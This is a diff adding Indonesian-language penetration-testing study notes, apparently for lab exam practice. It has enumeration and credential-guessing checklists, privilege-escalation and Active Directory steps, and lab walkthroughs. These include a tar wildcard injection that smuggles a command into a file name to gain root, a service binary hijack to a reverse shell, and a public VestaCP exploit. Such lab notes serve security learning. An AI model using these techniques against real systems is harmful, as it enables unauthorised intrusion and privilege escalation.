@@ -3371,3 +3371,273 @@ impacket-lookupsid anonymous@10.64.181.62 -no-pass
 
 impacket-lookupsid guest@10.64.181.62 -no-pass
 ```
+
+
+SNMP check
+```
+snmp-check -v2c -c public 192.168.184.149
+snmpwalk -v v2c -c public <host> NET-SNMP-EXTEND-MIB::nsExtendObjects
+```
+
+
+
+#### Methodology
+
+Intinya enumeration enumeration dan enumeration sebanyak mungkin informasi yang bisa digunakan
+```
+nmap -sV -sC -sT 192.168.1.1
+
+nmap -sV -sC -sT -oN output 192.168.1.1
+
+rustscan -a 192.168.115.121
+```
+
+Usahakan dokumentasikan semua temuan pada suatu file txt agar lebih memudahkan. saat port terbuka, jelas ada suatu service yang running dan bisa lanjut untuk cek cek dan scanning pada specific service tertentu
+
+
+phase 1 enumeration : 
+- Full TCP scan
+- Version detection
+- OS detection
+- Script scan untuk service umum
+- Check icmp port 161 : nmap -sU -p 161 host
+- Pada port yang gajelas, lakukan nc -nv host atau setelah nc ketik command apapun misal "help" biasanya ada response
+
+Checklist service terbuka :
+- Web? 
+- SMB?
+- LDAP?
+- Kerberos?
+- MSSQL?
+- FTP?
+- SMTP?
+- WinRM?
+- SSH?
+- RPC?
+
+Disini jika terbuka berarti ada something, jadi perlu cek secara manual. selalu cek default credential pada tiap machine.
+
+##### web ?
+1. View source
+2. robots.txt
+3. sitemap.xml
+4. Directory brute force
+5. Subdomain check
+6. Tech fingerprint
+7. Version detection
+8. Default credential
+9. File upload check
+10. Backup file check (.bak, .old, .zip)
+
+Baru jika tidak ada, lanjut cek ke CVE
+
+###### SMB ?
+- Anonymous login?
+- List share?
+- Check read/write?
+- Download semua yang bisa dibaca.
+- Search credential di file.
+
+Jika ditemukan credential, stop dan lanjut ke scanning.
+###### Credential stuffing / reuse
+
+Jadi setelah dapat credential coba ke host lain dan service : 
+- SMB
+- WinRM
+- RDP
+- SSH
+- Web login
+- Database
+
+Kalau ada service login dan:
+
+- Tidak tahu username
+- Tidak tahu password
+- Tidak ada user enum jelas
+
+
+Maka WAJIB coba:
+1. anonymous (FTP)
+2. service:service
+3. machine:machine
+4. admin:admin
+5. test:test
+6. guest:guest
+
+atau jika ditemukan usernamenya saja misal bahrul, maka bisa coba dengan set credential :
+
+- bahrul:bahrul
+
+
+##### Post-Exploitation 
+
+Setelah foothold didapat, jangan ovt dan bingung jadi urutan checklist-nya seperti berikut : 
+
+###### Linux
+1. sudo -l
+2. SUID binary
+3. Capabilities
+4. Cronjob
+5. Writable file in /etc
+6. PATH hijack
+7. Check backup file
+8. Kernel version → public exploit (baru ini)
+9. Password reuse in config files
+10. SSH key reuse
+
+Kernel exploit hanya kalau:
+- Versi vulnerable jelas
+- Tidak ada jalur misconfig
+
+###### Windows
+1. whoami /priv
+2. whoami /groups
+3. Check recursive dir C:/users
+4. Service misconfiguration
+5. Unquoted service path
+6. Writable service binary
+7. Scheduled task
+8. Registry autorun
+9. Check backup file
+10. Credential in file
+11. AlwaysInstallElevated
+12. SeImpersonate → potato attack
+Kernel exploit = opsi terakhir
+
+ketika melakukan foothold dan ingin privesc atau lateral movement, maka saat ditemukan file yang kita rasa aneh bisa download di local dan analysis. bisa menggunakan tools berikut :
+
+- strings
+- exiftool
+
+###### Jika Active Directory ? 
+
+Tanya dan buat hipotesa :
+- User ini member group apa?
+- Ada delegation?
+- Ada SPN?
+- Ada kerberoast?
+- Ada AS-REP roast?
+
+Dan setiap dapat hash, ticket, plain-text password maka lakukan credential loop lagi 
+- Crack
+- Reuse
+- Pass-the-hash
+- try lateral
+
+Tiap dapat user system/administrator maka mimikatz wajib dilakukan.
+
+Lateral movement, urutannya :
+- SMB
+- WinRM
+- PSExec
+- WMI
+- RDP
+
+Jika admin local di satu mesin cek di mesin lain entah dengan pass the hash maupun cleartext password.
+
+###### Challenge 6
+##### Active Directory Set :
+port 8000 open, dan directory /partners terbuka dengan isi berikut :
+
+- /partners/db
+- /partners/changelog
+
+Setelah di extract ditemukan set credential :
+- ecorp
+- support
+- bcorp
+- acorp
+
+Dan kita coba reuse semua, ditemukan yang valid :
+- support:Freedom1
+
+lakukan ssh : 
+- ssh support@ip
+
+setelah foothold, langkah awal yaitu cek semua file didalam dimulai dari directory C:\users dan ditemukan file C:\Users\support\admintool.exe
+
+menggunakan strings untuk melihat strings yang terdapat pada binary dan ditemukan satu set credential :
+
+- strings admintool.exe | grep password
+- credential found : administrator:december31
+
+lanjut login ssh menjadi local admin. Lalu cek lagi tiap file mulai dari history_powershell dan keseluruhan directory.
+
+setelah dumping mimikatz, ditemukan credential celia.almeda:7k8x, dan kita bisa mulai chisel untuk setup port forwarding.
+
+di host 2, credential celia.almeda valid, dan ada directory c:\windows.old\ dan setelah investigasi terdapat SAM file untuk dilakukan extract local dan ditemukannya domain admin dengan user tom_admin beserta hashnya. lanjut compromised Domain Controller. 
+
+PWND.
+
+
+##### Linux 1  :
+
+udp scanning pada protocol snmp dan ditemukan credential :
+- jack:3PUK
+
+nmap juga menunjukkan port 8083 dimana merupakan vestaCP. Jadi lanjut exploit menggunakan vestaROOT.py
+
+```
+python3 vestaROOT.py http://192.168.1.1:8083 jack 3PUK
+```
+
+Get Shell ROOT
+##### Linux 2
+
+port scanning menunjukkan beberapa port dan FTP terbuka, jadi langsung login as anonymous.
+
+Retrive semua file dan menggunakna exiftool -a pada file NEWSLETTER-TEMPLATE.pdf untuk extract medata dan ditemukan username :
+- Mark, Robert, Cassie
+
+Saat ditemukan credential seperti ini usahakan menggunakan default credential dari user yang didapatkan :
+- mark:mark
+- Mark:Mark
+- Robert:Robert
+- robert:robert
+- Cassie:Cassie
+- cassie:cassie
+
+dan gunakan login pada service yang memerlukan authentikasi. dan kebetulan ada service usermin pada port 2000 dan dengan credential yang valid yaitu cassie:cassie. Masuk console dan lanjut reverse shell.
+
+setelah enumeration, maka ditemukan suatu crontab yang berjalan pada /etc/crontab
+
+```
+*/2 root cd /opt/admin && tar -zxf /tmp/backup.tar.gz **
+```
+
+Dan karena /opt/admin writable maka kita bisa isi suatu script bash 
+
+```
+echo "chmod u+s /bin/bash" > /opt/admin/test.sh
+echo "" > "--checkpoint-action=exec=sh test.sh"
+echo "" --checkpoint=1 
+```
+
+Setelah 2 menit ketik /bin/bash -p dan otomatis akan menjadi root.
+
+
+##### Machine windows 3
+
+menggunakan nmap dan rustscan port 9099 terbuka. Setelah identifikasi, service menjalankan mouse -rce dimana terdapat suatu exploit public :
+
+```
+https://github.com/CSpanias/mobile-mouse-rce
+```
+
+Enumerating menggunakan winpeas dan ditemukan service GPGOrchestrator service yang writable config dan menggunakan sc config kita bisa melakukan modifikasi binary
+
+```
+sc config GPGOrchestrator binpath="C:\Windows\Temp\rev.exe"
+```
+
+Restart service 
+
+```
+net stop GPGOrchestrator
+net start GPGOrchestrator
+
+//or
+
+sc stop GPGOrchestrator
+sc start GPGOrchestrator
+```
